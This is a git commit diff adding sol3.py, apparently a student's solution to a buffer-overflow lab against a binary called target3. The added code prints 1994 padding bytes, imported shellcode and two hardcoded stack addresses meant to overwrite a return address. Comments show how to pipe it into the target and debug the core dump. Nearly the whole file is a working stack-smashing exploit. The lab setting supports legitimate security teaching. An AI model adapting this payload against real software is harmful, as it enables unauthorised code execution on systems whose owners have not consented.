368254368b73808035eee1e2893db52ffa343422
seeljack <97189984+seeljack@users.noreply.github.com>
2023-11-08 19:16:30 -0500

    Update sol3.py

--- sol3.py
+++ sol3.py
@@ -1,5 +1,14 @@
 #!/usr/bin/env python3
+#run <(python3 sol3.py)
 
+#./target3 <(python3 sol3.py)
+# gdb ./target3 core
 import sys
 
 from shellcode import shellcode
+
+
+sys.stdout.buffer.write(b'A'*(1994))
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(0x7ffffff685a8.to_bytes(8,'little'))
+sys.stdout.buffer.write(0x7ffffff68598.to_bytes(8,'little'))
